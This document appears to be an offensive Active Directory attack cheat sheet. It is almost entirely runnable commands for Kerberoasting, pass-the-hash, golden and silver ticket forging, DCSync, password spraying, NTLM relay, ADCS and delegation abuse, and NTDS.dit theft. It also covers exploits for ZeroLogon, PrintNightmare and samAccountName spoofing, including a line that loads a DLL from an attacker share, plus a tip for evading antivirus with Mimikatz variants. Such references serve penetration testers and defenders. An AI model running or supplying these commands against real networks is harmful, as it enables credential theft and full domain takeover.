# Active Directory Attacks Reference

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack tools |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |
| Certipy | AD Certificate Services attacks |

## Prerequisites

- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Clock sync with DC (Kerberos requires +/-5 min)

```bash
# Fix clock skew
nmap -sT DC_IP -p445 --script smb2-time
sudo date -s "14 APR 2024 18:25:16"
faketime -f '+8h' <command>
```

## Domain Enumeration

### BloodHound Collection
```bash
# SharpHound (Windows)
.\SharpHound.exe -c All

# Python collector (Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns DC_IP -c all
```

### PowerView Enumeration
```powershell
Get-NetDomain && Get-DomainSID && Get-NetDomainController
Get-NetUser -SamAccountName targetuser
Get-NetGroupMember -GroupName "Domain Admins"
Find-LocalAdminAccess -Verbose
Invoke-UserHunter -Stealth
```

## Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap DC_IP -u user -p password --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

## AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication":

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack
hashcat -m 18200 hashes.txt rockyou.txt
```

## Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@TARGET -hashes :NTHASH
wmiexec.py domain.local/Administrator@TARGET -hashes :NTHASH
smbexec.py domain.local/Administrator@TARGET -hashes :NTHASH

# CrackMapExec
crackmapexec smb TARGET -u Administrator -H NTHASH -d domain.local
crackmapexec smb TARGET -u Administrator -H NTHASH --local-auth
```

## OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
```

## Golden Ticket

Forge TGT with krbtgt hash for any user:

```powershell
# DCSync to get krbtgt hash first
mimikatz# lsadump::dcsync /user:krbtgt

# Create Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
```

## Silver Ticket

Forge TGS for specific service:

```powershell
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

## DCSync Attack

```bash
# Impacket (requires Replicating Directory Changes rights)
secretsdump.py domain.local/admin:password@DC_IP -just-dc-user krbtgt
secretsdump.py domain.local/admin:password@DC_IP -just-dc-user Administrator

# Mimikatz
lsadump::dcsync /domain:domain.local /user:Administrator
```

## Password Spraying

```bash
# Kerbrute
./kerbrute passwordspray -d domain.local --dc DC_IP users.txt Password123

# CrackMapExec (careful of lockouts)
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
```

## NTLM Relay Attacks

```bash
# Check for SMB signing (find relay targets)
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# Responder + ntlmrelayx
responder -I eth0 -wrf
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP relay for delegation
ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
```

## AD Certificate Services (ADCS)

### ESC1 - Misconfigured Templates
```bash
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template VulnTemplate -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC8 - Web Enrollment Relay
```bash
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 petitpotam.py ATTACKER_IP DC_IP
```

## Delegation Attacks

### Unconstrained Delegation
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
.\SpoolSample.exe DC01.domain.local HELPDESK.domain.local
Rubeus.exe monitor /interval:1
```

### Constrained Delegation
```bash
# Rubeus S4U2 attack
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# Impacket
getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
```

### Resource-Based Constrained Delegation (RBCD)
```powershell
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

## Critical CVEs

### ZeroLogon (CVE-2020-1472)
```bash
crackmapexec smb DC_IP -u '' -p '' -M zerologon
python3 cve-2020-1472-exploit.py DC01 DC_IP
secretsdump.py -just-dc domain.local/DC01\$@DC_IP -no-pass
# IMPORTANT: Restore password after!
```

### PrintNightmare (CVE-2021-1675)
```bash
rpcdump.py @DC_IP | grep 'MS-RPRN'
python3 CVE-2021-1675.py domain.local/user:pass@DC_IP '\\attacker\share\evil.dll'
```

### samAccountName Spoofing (CVE-2021-42278/42287)
```bash
python3 sam_the_admin.py "domain.local/user:password" -dc-ip DC_IP -shell
```

## Credential Sources

### LAPS Password
```bash
crackmapexec ldap DC_IP -u user -p password -M laps
```

### GMSA Password
```powershell
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
```

### GPP Passwords
```bash
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
python3 Get-GPPPassword.py -no-pass 'DC_IP'
```

## Lateral Movement

### LLMNR/NBNS Poisoning
```bash
responder -I eth1 -v
```

### VSS Shadow Copy (NTDS.dit extraction)
```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

## Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
| Account lockouts | Reduce spray rate, check lockout policy |
